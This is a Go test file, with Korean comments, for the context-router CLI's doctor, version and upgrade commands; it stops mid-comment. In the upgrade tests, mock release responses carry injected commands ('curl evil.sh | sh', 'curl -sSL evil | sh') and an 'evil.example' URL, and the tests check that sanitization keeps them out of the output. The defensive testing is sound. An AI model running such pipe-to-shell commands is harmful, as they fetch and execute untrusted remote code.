package cli

import (
	"bytes"
	"context"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime/debug"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/wotjr1649/context-router/internal/ident"
	"github.com/wotjr1649/context-router/internal/session"
	"github.com/wotjr1649/context-router/internal/store"
)

// isolateCodexHome — doctor·설치기 테스트에 각자의 CODEX_HOME을 준다. 호스트 격리가 목적이
// **아니다**: TestMain이 이미 CODEX_HOME을 비우고 HOME·USERPROFILE을 임시로 돌려 실제
// ~/.codex는 닿지 않는다. 결함은 그 임시 홈이 패키지 전체에 공유된다는 것이다 — CODEX_HOME을
// 세우지 않는 설치기 테스트가 쓴 config.toml을 뒤에 도는 doctor 테스트가 읽어, 단정이 실행
// 순서에 종속된다. 돌려주는 경로에 픽스처를 써서 상태를 만든다.
func isolateCodexHome(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("CODEX_HOME", dir)
	return dir
}

// writeCodexConfig — CODEX_HOME에 config.toml을 쓴다.
func writeCodexConfig(t *testing.T, home, src string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte(src), 0o600); err != nil {
		t.Fatalf("config.toml 쓰기 실패: %v", err)
	}
}

// doctorOut — doctor를 돌려 출력과 오류를 돌려준다. runDoctor의 시그니처를 한 자리에만 두어
// 뒤 태스크가 인자 순서를 되풀이하지 않게 한다.
func doctorOut(t *testing.T, projectRoot string) (string, error) {
	t.Helper()
	var buf bytes.Buffer
	err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.17.0")
	return buf.String(), err
}

// TestIsolateCodexHome — 격리 헬퍼가 실제로 doctorCodexConfigPath를 돌리는가. 이 파일의
// doctor 단정이 전부 이 헬퍼 위에 서므로, 헬퍼가 조용히 망가지면 그 단정들이 공유 임시 홈을
// 보게 되고 무엇을 단정했는지 알 수 없어진다. 긍정형으로 둔다 — 경로 자체를 단정하면 픽스처가
// 바꾸는 문면뿐 아니라 홈이 어디로 떨어지는지까지 잡는다(반환 디렉터리 아래인지, 거기 쓴
// 픽스처를 doctor가 실제로 읽는지). 후반부는 D97 계약 2의 감지원(codexServerHeaders)이
// 파일:줄을 실제로 보고하는지도 함께 검증한다.
func TestIsolateCodexHome(t *testing.T) {
	home := isolateCodexHome(t)
	want := filepath.Join(home, "config.toml")
	if got, err := doctorCodexConfigPath(); err != nil || got != want {
		t.Fatalf("doctorCodexConfigPath = %q err=%v, want %q", got, err, want)
	}
	writeCodexConfig(t, home, "[mcp_servers.ctr]\ncommand = \"context-router\"\n")
	out, _ := doctorOut(t, t.TempDir())
	if !strings.Contains(out, "플러그인 이전 방식의 등록물이 남아 있다 — "+want+":1") {
		t.Errorf("doctor가 격리된 홈의 픽스처를 파일:줄로 짚지 않았다:\n%s", out)
	}
}

// D56 — version 서브커맨드: ProductVersion 1줄만 출력(CI 추출 표면, 스펙 §0).
func TestRunVersionSubcommand(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "version", nil, t.TempDir(), t.TempDir(), "9.9.9-test", &out, &errOut)
	if err != nil {
		t.Fatalf("err=%v", err)
	}
	if out.String() != "9.9.9-test\n" {
		t.Fatalf("out=%q want %q", out.String(), "9.9.9-test\n")
	}
	if err := Run(context.Background(), "version", []string{"x"}, t.TempDir(), t.TempDir(), "v", &out, &errOut); err == nil {
		t.Fatal("잉여 인자 미거부")
	}
}

// D56 — formatBuildLine 양 경로(검수 반영 — 순수 포매터라 결정적).
func TestFormatBuildLine(t *testing.T) {
	if got := formatBuildLine("9.9.9-test", nil); got != "[17] build: 9.9.9-test ()" {
		t.Fatalf("nil(실패) 경로: %q", got)
	}
	bi := &debug.BuildInfo{GoVersion: "go1.26.5", Settings: []debug.BuildSetting{
		{Key: "vcs.revision", Value: "abcdef0123456789"},
		{Key: "vcs.modified", Value: "true"},
	}}
	got := formatBuildLine("9.9.9-test", bi)
	for _, want := range []string{"go=go1.26.5", "commit=abcdef012345", "dirty"} {
		if !strings.Contains(got, want) {
			t.Fatalf("%q 누락: %q", want, got)
		}
	}
}

// TestRunUpgrade_Table: httptest 서버로 정상/오류/타임아웃/위생검증 경로를 모두 확인한다
// (설계 §7 — upgrade 위생: 응답 제공 URL·기타 필드는 절대 출력 금지, tag_name만 취함).
func TestRunUpgrade_Table(t *testing.T) {
	tests := []struct {
		name       string
		handler    http.HandlerFunc
		clientTO   time.Duration
		wantOut    string
		notContain []string
	}{
		{
			name: "ok_two_lines_plus_install",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.2.3"}`))
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\nlatest: v1.2.3\ninstall: download from the project releases page and replace the binary\n",
		},
		{
			name: "non_200_falls_back_to_current_only",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusInternalServerError)
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\n",
		},
		{
			name: "malicious_tag_name_rejected_by_sanitization",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.0\nmalicious: curl evil.sh | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\n",
			notContain: []string{"malicious", "curl"},
		},
		{
			name: "response_provided_fields_never_leak",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v9.9.9","html_url":"http://evil.example/pwned","upgrade_command":"curl -sSL evil | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\nlatest: v9.9.9\ninstall: download from the project releases page and replace the binary\n",
			notContain: []string{"evil.example", "curl -sSL", "pwned"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := httptest.NewServer(tt.handler)
			defer srv.Close()
			var buf bytes.Buffer
			client := &http.Client{Timeout: tt.clientTO}
			if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
				t.Fatalf("err=%v want nil", err)
			}
			got := buf.String()
			if got != tt.wantOut {
				t.Fatalf("out=%q want %q", got, tt.wantOut)
			}
			for _, s := range tt.notContain {
				if strings.Contains(got, s) {
					t.Fatalf("out=%q must not contain %q", got, s)
				}
			}
		})
	}

	// 타임아웃: 핸들러가 느리게 응답하고 client.Timeout을 매우 짧게 주입한다. 경과시간으로
	// 실제 10s(운영 상수)를 기다리지 않았음을 증명한다 — 인젝션된 client가 근거.
	t.Run("timeout_falls_back_to_current_only", func(t *testing.T) {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			time.Sleep(300 * time.Millisecond)
			w.Write([]byte(`{"tag_name":"v1.2.3"}`))
		}))
		defer srv.Close()
		var buf bytes.Buffer
		client := &http.Client{Timeout: 30 * time.Millisecond}
		start := time.Now()
		if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
			t.Fatalf("err=%v want nil", err)
		}
		if elapsed := time.Since(start); elapsed > 2*time.Second {
			t.Fatalf("took %v — suspiciously long, real 10s constant may have been used instead of injected client", elapsed)
		}
		want := "current: v0.0.1-dev\n"
		if buf.String() != want {
			t.Fatalf("out=%q want %q", buf.String(), want)
		}
	})
}

// TestRunDoctor_Smoke: 미생성 storeRoot(부모만 존재) + 임시 프로젝트 디렉터리로 doctor를
// 실행한다. content.db가 없으므로 "not initialized"가 나와야 하고, err=nil이어야 하며,
// doctor는 store를 생성하면 안 된다(no-create, 설계 §7) — storeRoot 자체도, 프로젝트별
// store 디렉터리도 실행 후 여전히 존재하지 않아야 한다.
func TestRunDoctor_Smoke(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	storeRoot := filepath.Join(base, "storeroot") // 의도적 미생성 — 부모(base)만 존재
	projectRoot := filepath.Join(base, "proj")
	if err := os.MkdirAll(filepath.Join(projectRoot, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}

	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, canon.ProjectID) {
		t.Fatalf("out missing ProjectID %q: %s", canon.ProjectID, out)
	}
	if !strings.Contains(out, "not initialized") {
		t.Fatalf("out missing 'not initialized': %s", out)
	}
	if !strings.Contains(out, "claude plugin marketplace add") {
		t.Fatalf("out missing plugin install snippet marker: %s", out)
	}

	if _, err := os.Stat(storeRoot); !os.IsNotExist(err) {
		t.Fatalf("store root must not be created by doctor: stat err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(storeRoot, "projects", canon.ProjectID)); !os.IsNotExist(err) {
		t.Fatalf("per-project store dir must not be created by doctor: stat err=%v", err)
	}
}

// TestRunDoctor_InitializedStore: 실제 store.Open(dir,false)+Close로 content.db를 생성한
// 뒤(read-write로 스키마까지 마이그레이션됨) doctor를 read-only로 실행한다. 리뷰에서 발견된
// 버그 — reader가 store.Open(dir,true)의 mode=ro&query_only(ON) 연결이라 예전 fts5 프로브
// (CREATE VIRTUAL TABLE)가 SQLITE_READONLY로 항상 실패하던 것 — 의 회귀를 막는다: err=nil과
// "fts5: 가능" 출력을 직접 검증한다(TestRunDoctor_Smoke는 미초기화 분기만 커버해 이 버그를
// 가렸었다).
func TestRunDoctor_InitializedStore(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	if err := os.MkdirAll(filepath.Join(projectRoot, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}

	st, err := store.Open(filepath.Join(storeRoot, "projects", canon.ProjectID), false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "user_version=1 quick_check=ok") {
		t.Fatalf("out missing content.db quick_check=ok: %s", out)
	}
	if !strings.Contains(out, "[4] fts5: 가능") {
		t.Fatalf("out missing fts5 available on an initialized (read-only-probed) store: %s", out)
	}
}

// TestRunDoctor_ContentDBSize: D33a [14] — content.db 규모 행이 sources·artifacts 행수와
// artifacts/ CAS 물리 blob 바이트의 정확값을 방출한다. fixture: 인덱스 아티팩트 2개(길이 10·15,
// 상이) + raw blob 2회 기록(동일 20B 콘텐츠 → dedup으로 물리 1파일). blob 바이트는 물리 파일
// 합산이라 10+15+20=45 — DB 파일 크기 합산이나 0 방출 오구현, dedup 미반영(65) 오구현을 걸러낸다.
func TestRunDoctor_ContentDBSize(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	raw := []byte(strings.Repeat("R", 20)) // 두 소스가 공유하는 원본 blob(20B) — 물리 dedup 검증용
	reg := func(uri, idx string) {
		if _, err := st.Register(context.Background(), store.Registration{
			StoredBytes: []byte(idx), MediaType: "text/plain",
			Source:  store.SourceMeta{URI: uri, Kind: "file", SrcHash: uri},
			Chunks:  []store.Chunk{{Ordinal: 0, Text: idx}},
			RawBlob: raw,
		}); err != nil {
			t.Fatalf("register %s: %v", uri, err)
		}
	}
	reg("/src-a", strings.Repeat("a", 10)) // 인덱스 콘텐츠 A(10B)
	reg("/src-b", strings.Repeat("b", 15)) // 인덱스 콘텐츠 B(15B) — A와 상이 → artifacts=2
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "[14] content.db: sources=2 artifacts=2 blob=45B") {
		t.Fatalf("out missing exact content.db size line:\n%s", buf.String())
	}
	// D40 — content.db 파일 실크기 병기(FileBytes). 값은 페이지/WAL에 따라 가변이라 접미 존재만 단정.
	if !strings.Contains(buf.String(), " file=") {
		t.Fatalf("out missing content.db file= suffix:\n%s", buf.String())
	}
}

// D38 — blob 총량 > 임계면 [14] 뒤 경고 1줄(purge 비선택 성격 병기), 임계 미만이면 무출력.
// SizeStats 실패("없음") 경로는 else 분기 밖이라 경고 미평가가 구조로 보장된다(기존 테스트 커버).
// 셋업·호출은 TestRunDoctor_ContentDBSize 관례.
func doctorSizeWarnSetup(t *testing.T) (storeRoot, projectRoot string) {
	t.Helper()
	// 부모 env의 임계 키 누수 시 무경고 단정이 거짓 실패(Codex P2) — 양 축을 기본값으로
	// 고정(""=기본 폴백, 개별 테스트의 후행 t.Setenv가 덮어씀).
	t.Setenv("CTR_STORE_WARN_BYTES", "")
	t.Setenv("CTR_CONTENT_FILE_WARN_BYTES", "")
	storeRoot, projectRoot = t.TempDir(), t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	st, err := store.Open(filepath.Join(storeRoot, "projects", canon.ProjectID), false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(context.Background(), store.Registration{
		StoredBytes: []byte(strings.Repeat("a", 10)), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/src-a", Kind: "file", SrcHash: "/src-a"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: strings.Repeat("a", 10)}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}
	return storeRoot, projectRoot
}

// D38 — storeWarnBytes 오버라이드 채택 규칙 직접 단정(v0.4 최종 리뷰 이월): 양수만 채택,
// 비양수·파싱 실패·미설정은 기본값(100MiB) 폴백.
func TestStoreWarnBytes(t *testing.T) {
	cases := []struct {
		env  string
		want int64
	}{
		{"5", 5},
		{"0", defaultStoreWarnBytes},
		{"-1", defaultStoreWarnBytes},
		{"abc", defaultStoreWarnBytes},
		{"", defaultStoreWarnBytes},
	}
	for _, c := range cases {
		getenv := func(k string) string { // 키 대조 — 신규 env명을 정확히 읽는지가 단정의 일부
			if k == "CTR_STORE_WARN_BYTES" {
				return c.env
			}
			return ""
		}
		if got := storeWarnBytes(getenv); got != c.want {
			t.Fatalf("storeWarnBytes(env=%q)=%d want %d", c.env, got, c.want)
		}
	}
}

func TestRunDoctor_StoreSizeWarn(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_STORE_WARN_BYTES", "5") // blob 10B > 5B → 발화
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	for _, want := range []string{"[14] warning:", "purge", "--hook-only"} {
		if !strings.Contains(buf.String(), want) {
			t.Fatalf("out missing %q:\n%s", want, buf.String())
		}
	}
}

func TestRunDoctor_StoreSizeWarnSilentUnderThreshold(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t) // 임계 미설정 — 기본 100MiB
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "[14] content.db: sources=1 artifacts=1 blob=10B") {
		t.Fatalf("out missing exact [14] line(무회귀):\n%s", buf.String())
	}
	if strings.Contains(buf.String(), "[14] warning") {
		t.Fatalf("경고가 임계 미만에서 발화:\n%s", buf.String())
	}
}

// TestRunDoctor_ContentFileWarn — D46 발화: 전용 키만 소액 설정 — content.db 파일은 항상 >1B.
// 픽스처·doctor 실행부는 TestRunDoctor_StoreSizeWarn과 동일. 역방향 축 독립(file 키 조정 시
// blob 침묵)도 여기서 단정 — AxisIndependent 테스트의 blob→file 방향과 쌍.
func TestRunDoctor_ContentFileWarn(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_CONTENT_FILE_WARN_BYTES", "1")
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[14] warning: file ") || !strings.Contains(out, "CTR_CONTENT_FILE_WARN_BYTES") {
		t.Fatalf("파일 축 경고 미발화:\n%s", out)
	}
	if strings.Contains(out, "[14] warning: blob ") {
		t.Fatalf("file 키 조정이 blob 축 경고를 발화(키 분리 위반):\n%s", out)
	}
}

// TestRunDoctor_ContentFileWarnAxisIndependent — D46 축 독립: blob 키만 낮추면 blob 경고만
// 발화하고 파일 경고는 기본 100MiB 임계라 침묵한다(소형 픽스처 ≪ 100MiB — 전용 키 분리 판별).
func TestRunDoctor_ContentFileWarnAxisIndependent(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_STORE_WARN_BYTES", "1")
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[14] warning: blob ") {
		t.Fatalf("blob 경고 미발화:\n%s", out)
	}
	if strings.Contains(out, "[14] warning: file ") {
		t.Fatalf("blob 키 조정이 파일 축 경고를 발화(키 분리 위반):\n%s", out)
	}
}

// TestContentFileWarnBytes — CTR_CONTENT_FILE_WARN_BYTES 양수만 채택(storeWarnBytes와 동형).
func TestContentFileWarnBytes(t *testing.T) {
	if got := contentFileWarnBytes(func(string) string { return "" }); got != 100<<20 {
		t.Fatalf("기본값: %d", got)
	}
	if got := contentFileWarnBytes(func(string) string { return "12345" }); got != 12345 {
		t.Fatalf("env 채택: %d", got)
	}
	if got := contentFileWarnBytes(func(string) string { return "-1" }); got != 100<<20 {
		t.Fatalf("비양수 거부: %d", got)
	}
}

// seedShadowContentDB — projDir/content.db에 hook 단독(귀속) 아티팩트 1개 + file(비귀속) 1개를
// Register하고 귀속 hash(=hex(sha256(hookContent))=CAS 파일명=ShadowOwned 키)를 반환한다.
func seedShadowContentDB(t *testing.T, projDir string) (ownedHash string) {
	t.Helper()
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	const hookContent = "hook-only-shadow-content"
	if _, err := st.Register(context.Background(), store.Registration{
		StoredBytes: []byte(hookContent), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "shadow:Bash:1", Kind: "hook", SrcHash: "sh-hook"},
	}); err != nil {
		t.Fatalf("register hook: %v", err)
	}
	if _, err := st.Register(context.Background(), store.Registration{ // 비귀속(file 직접 참조) — 버킷에 안 들어가야 함
		StoredBytes: []byte("explicit-file-content"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/tmp/f.txt", Kind: "file", SrcHash: "sh-file"},
	}); err != nil {
		t.Fatalf("register file: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}
	sum := sha256.Sum256([]byte(hookContent))
	return hex.EncodeToString(sum[:])
}

// seedShadowWorktree — wdir에 정상 session.db를 부트스트랩(session.Open)한 뒤 지정 session_id로
// artifact_created 이벤트 1건을 raw INSERT한다. session_id 접두(cc:/cx:)를 통제해야 하는데
// session.Open은 서버 UUID를 발급하므로 공개 API로는 만들 수 없다 — 실제 훅 경로(dispatch)도
// ExternalSessionID 접두 session_id로 append한다. artifact_refs는 정본 URI JSON 배열.
func seedShadowWorktree(t *testing.T, wdir, sid string, refs []string) {
	t.Helper()
	d, err := session.Open(wdir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open(%s): %v", wdir, err)
	}
	if err := d.Close(); err != nil {
		t.Fatalf("session.Close: %v", err)
	}
	dbPath := filepath.ToSlash(filepath.Join(wdir, "session.db"))
	db, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(5000)")
	if err != nil {
		t.Fatalf("open session.db rw: %v", err)
	}
	defer func() { _ = db.Close() }()
	refsJSON, err := json.Marshal(refs)
	if err != nil {
		t.Fatalf("marshal refs: %v", err)
	}
	if _, err := db.Exec(`INSERT INTO session_events(event_id, session_id, event_type, ts, summary, artifact_refs, redaction)
		VALUES(?,?,?,?,?,?,?)`, "evt-"+sid, sid, "artifact_created", int64(1700000000), "seeded shadow", string(refsJSON), "none"); err != nil {
		t.Fatalf("insert artifact_created: %v", err)
	}
	if _, err := db.Exec("PRAGMA wal_checkpoint(TRUNCATE)"); err != nil { // ro doctor가 결정적으로 보게 flush
		t.Fatalf("checkpoint: %v", err)
	}
}

// TestDoctorShadowOwnedLine — D40 §2: [15] 접두 분해. hook 단독(귀속) hash를 cc: 세션이
// artifact_created로 참조 → cc: 버킷. 비귀속(file) ref는 귀속 hash가 아니라 무시된다.
func TestDoctorShadowOwnedLine(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	ownedHash := seedShadowContentDB(t, projDir)

	sid := "cc:00000000-0000-7000-8000-0000000000aa"
	seedShadowWorktree(t, filepath.Join(projDir, "worktrees", "wt1"), sid, []string{
		"artifact://" + sid + "/sha256-" + ownedHash,               // 귀속 → cc: 버킷
		"artifact://" + sid + "/sha256-" + strings.Repeat("e", 64), // 비귀속 → 무시
	})

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	for _, want := range []string{"[15] shadow-owned: ", "cc:=", "hashes=1", "cx:=0B shared=0B unattributed=0B"} {
		if !strings.Contains(out, want) {
			t.Fatalf("doctor 출력에 %q 없음:\n%s", want, out)
		}
	}
	if strings.Contains(out, "세션 분해 없음") || strings.Contains(out, "incomplete") {
		t.Fatalf("정상 경로인데 '세션 분해 없음'/'incomplete' 병기:\n%s", out)
	}
}

// TestDoctorShadowOwnedIncomplete — 손상 session.db 1개가 섞여도 그 worktree만 건너뛰고 괄호
// 끝에 incomplete를 병기하며, [15] 실패는 doctor 전역 failed에 안 들어가 성공 종료한다.
func TestDoctorShadowOwnedIncomplete(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)

	// 정상 worktree 1개(비어 있어도 열림 → usable≥1이어야 incomplete 형식이 나온다).
	d, err := session.Open(filepath.Join(projDir, "worktrees", "ok"), session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open ok: %v", err)
	}
	if err := d.Close(); err != nil {
		t.Fatalf("session.Close ok: %v", err)
	}

	// 손상 worktree: 0xEE 4096B session.db(SQLITE_NOTADB) — 첫 쿼리에서 오류(TestSessionRuntimeStorageErrorMapsToStorageUnavailable와 동형).
	corrupt := filepath.Join(projDir, "worktrees", "corrupt")
	if err := os.MkdirAll(corrupt, 0o755); err != nil {
		t.Fatalf("mkdir corrupt: %v", err)
	}
	if err := os.WriteFile(filepath.Join(corrupt, "session.db"), bytes.Repeat([]byte{0xEE}, 4096), 0o600); err != nil {
		t.Fatalf("write corrupt session.db: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v ([15] 실패가 전역 failed로 새면 안 됨) out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[15] shadow-owned: ") || !strings.Contains(out, "incomplete") {
		t.Fatalf("incomplete 병기 없음:\n%s", out)
	}
	if strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("usable worktree가 있는데 '세션 분해 없음':\n%s", out)
	}
}

// doctorShadowProjDir — [15] 분해 테스트 공용 셋업: (storeRoot, projectRoot, projDir).
func doctorShadowProjDir(t *testing.T) (storeRoot, projectRoot, projDir string) {
	t.Helper()
	storeRoot = t.TempDir()
	projectRoot = t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir = filepath.Join(storeRoot, "projects", canon.ProjectID)
	return
}

// TestDoctorShadowOwnedShared — D40 §2: 같은 귀속 hash를 cc:·cx: 세션이 함께 참조하면(한 worktree
// 내 두 세션) shared 버킷으로 집계되고 cc:/cx:/unattributed는 0이다.
func TestDoctorShadowOwnedShared(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	ownedHash := seedShadowContentDB(t, projDir)

	ccSid := "cc:00000000-0000-7000-8000-0000000000aa"
	cxSid := "cx:00000000-0000-7000-8000-0000000000bb"
	wt := filepath.Join(projDir, "worktrees", "wt1")
	seedShadowWorktree(t, wt, ccSid, []string{"artifact://" + ccSid + "/sha256-" + ownedHash})
	seedShadowWorktree(t, wt, cxSid, []string{"artifact://" + cxSid + "/sha256-" + ownedHash})

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	for _, want := range []string{"[15] shadow-owned: ", "hashes=1", "cc:=0B cx:=0B shared=", "unattributed=0B"} {
		if !strings.Contains(out, want) {
			t.Fatalf("shared 버킷 출력에 %q 없음:\n%s", want, out)
		}
	}
	if strings.Contains(out, "shared=0B") || strings.Contains(out, "incomplete") || strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("shared 집계 실패(shared=0B/incomplete/분해없음):\n%s", out)
	}
}

// TestDoctorShadowOwnedUnattributed — D40 §2: 귀속 hash가 어느 세션에도 참조되지 않으면(세션은
// 있으나 비귀속 hash만 참조) unattributed 버킷으로 집계된다(usable≥1이라 폴백 아님).
func TestDoctorShadowOwnedUnattributed(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	seedShadowContentDB(t, projDir) // ownedHash 존재하나 아래 세션은 참조하지 않음

	sid := "cc:00000000-0000-7000-8000-0000000000aa"
	wt := filepath.Join(projDir, "worktrees", "wt1")
	seedShadowWorktree(t, wt, sid, []string{"artifact://" + sid + "/sha256-" + strings.Repeat("d", 64)}) // 비귀속 hash

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "cc:=0B cx:=0B shared=0B unattributed=") {
		t.Fatalf("unattributed 버킷 형식 아님:\n%s", out)
	}
	if strings.Contains(out, "unattributed=0B") || strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("귀속 hash가 unattributed로 집계되지 않음:\n%s", out)
	}
}

// TestDoctorShadowOwnedMultiWorktree — D40 §2: worktree 2개의 세션 데이터가 합산된다. wt1(cc:)과
// wt2(cx:)가 각각 같은 hash를 참조 → shared는 두 worktree를 모두 순회해 접두를 병합했을 때에만
// 나온다(한쪽만 읽으면 cc:/cx: 단독). shared 결과가 곧 다중 worktree 합산의 증거.
func TestDoctorShadowOwnedMultiWorktree(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	ownedHash := seedShadowContentDB(t, projDir)

	ccSid := "cc:00000000-0000-7000-8000-0000000000aa"
	cxSid := "cx:00000000-0000-7000-8000-0000000000bb"
	seedShadowWorktree(t, filepath.Join(projDir, "worktrees", "wt1"), ccSid, []string{"artifact://" + ccSid + "/sha256-" + ownedHash})
	seedShadowWorktree(t, filepath.Join(projDir, "worktrees", "wt2"), cxSid, []string{"artifact://" + cxSid + "/sha256-" + ownedHash})

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "cc:=0B cx:=0B shared=") || strings.Contains(out, "shared=0B") {
		t.Fatalf("2개 worktree 접두 병합(shared) 실패:\n%s", out)
	}
	if strings.Contains(out, "incomplete") || strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("정상 2-worktree 경로인데 incomplete/분해없음:\n%s", out)
	}
}

// TestDoctorShadowOwnedNoSessionDecomp — D40 §2: content.db는 있으나 worktrees 세션이 하나도
